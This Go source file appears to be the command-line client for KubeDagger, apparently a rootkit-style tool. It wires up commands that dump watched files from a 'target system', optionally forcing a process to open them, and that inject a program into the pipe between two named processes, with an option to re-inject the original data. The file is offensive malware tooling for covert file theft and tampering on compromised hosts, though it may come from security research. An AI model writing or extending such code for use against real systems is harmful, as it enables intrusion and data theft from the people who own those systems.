package run

import (
	"fmt"
	"strings"

	"github.com/spf13/cobra"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/fs_watch"
	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/pipe_prog"
)

var cmdAddFSWatch = &cobra.Command{
	Use:   "add [path of file]",
	Short: "add a filesystem watch",
	Long:  "add is used to add a filesystem watch on the target system",
	RunE:  addFSWatchCmd,
	Args:  cobra.MinimumNArgs(1),
}

var cmdDeleteFSWatch = &cobra.Command{
	Use:   "delete [path of file]",
	Short: "delete a filesystem watch",
	Long:  "delete is used to remove a filesystem watch on the target system",
	RunE:  deleteFSWatchCmd,
	Args:  cobra.MinimumNArgs(1),
}

var cmdGetFSWatch = &cobra.Command{
	Use:   "get [path of file]",
	Short: "get a filesystem watch",
	Long:  "get is used to dump a watched file from the target system",
	RunE:  getFSWatchCmd,
	Args:  cobra.MinimumNArgs(1),
}

var cmdPutPipeProg = &cobra.Command{
	Use:   "put [program]",
	Short: "put sends a program to pipe",
	Long:  "put is used to send a program and the command of the process you want to pipe it to on the target system",
	RunE:  putPipeProgCmd,
	Args:  cobra.MinimumNArgs(1),
}

var cmdDelPipeProg = &cobra.Command{
	Use:   "delete",
	Short: "delete a piped program",
	Long:  "delete is used to delete a piped program on the target system",
	RunE:  delPipeProgCmd,
}

func addFSWatchCmd(cmd *cobra.Command, args []string) error {
	return fs_watch.SendAddFSWatchRequest(options.Target, args[0], options.InContainer, options.Active)
}

func deleteFSWatchCmd(cmd *cobra.Command, args []string) error {
	return fs_watch.SendDeleteFSWatchRequest(options.Target, args[0], options.InContainer, options.Active)
}

func getFSWatchCmd(cmd *cobra.Command, args []string) error {
	return fs_watch.SendGetFSWatchRequest(options.Target, args[0], options.InContainer, options.Active, options.Output)
}

func putPipeProgCmd(cmd *cobra.Command, args []string) error {
	if len(options.From) > 16 {
		return fmt.Errorf("'from' command too long (max is 16 chars): %s", options.From)
	}
	if strings.Contains(options.From, "#") {
		return fmt.Errorf("'from' contains an illegal character ('#'): %s", options.From)
	}
	if len(options.To) > 16 || len(options.To) == 0 {
		return fmt.Errorf("'to' command too long (max is 16 chars, min 1 char): %s", options.To)
	}
	if strings.Contains(options.To, "#") {
		return fmt.Errorf("'to' contains an illegal character ('#'): %s", options.To)
	}
	if strings.Contains(args[0], "_") {
		return fmt.Errorf("the piped program cannot contain a '_' character: %s", args[0])
	}

	return pipe_prog.SendPutPipeProgRequest(options.Backup, options.Target, options.From, options.To, args[0])
}

func delPipeProgCmd(cmd *cobra.Command, args []string) error {
	if len(options.From) > 16 {
		return fmt.Errorf("'from' command too long (max is 16 chars): %s", options.From)
	}
	if strings.Contains(options.From, "#") {
		return fmt.Errorf("'from' contains an illegal character ('#'): %s", options.From)
	}
	if len(options.To) > 16 || len(options.To) == 0 {
		return fmt.Errorf("'to' command too long (max is 16 chars, min 1 char): %s", options.To)
	}
	if strings.Contains(options.To, "#") {
		return fmt.Errorf("'to' contains an illegal character ('#'): %s", options.To)
	}

	return pipe_prog.SendDelPipeProgRequest(options.Target, options.From, options.To)
}

func init() {
	cmdFSWatch.PersistentFlags().BoolVar(
		&options.InContainer,
		"in-container",
		false,
		"defines if the watched file is in a container")
	cmdFSWatch.PersistentFlags().BoolVar(
		&options.Active,
		"active",
		false,
		"defines if kubedagger should passively wait for the file to be opened, or actively make a process open it")
	cmdFSWatch.PersistentFlags().StringVarP(
		&options.Output,
		"output",
		"o",
		"",
		"output file to write into")

	cmdFSWatch.AddCommand(cmdAddFSWatch)
	cmdFSWatch.AddCommand(cmdDeleteFSWatch)
	cmdFSWatch.AddCommand(cmdGetFSWatch)
	KUBEDaggerClient.AddCommand(cmdFSWatch)

	cmdPipeProg.PersistentFlags().StringVar(
		&options.From,
		"from",
		"",
		"command of the program sending data over the pipe (16 chars, '#' is a forbidden char)")
	cmdPipeProg.PersistentFlags().StringVar(
		&options.To,
		"to",
		"",
		"command of the program reading data from the pipe (16 chars, '#' is a forbidden char)")
	cmdPipeProg.PersistentFlags().BoolVar(
		&options.Backup,
		"backup",
		false,
		"defines if kubedagger should backup the original piped data and re-inject it after the provided program")

	cmdPipeProg.AddCommand(cmdPutPipeProg)
	cmdPipeProg.AddCommand(cmdDelPipeProg)
	KUBEDaggerClient.AddCommand(cmdPipeProg)
}
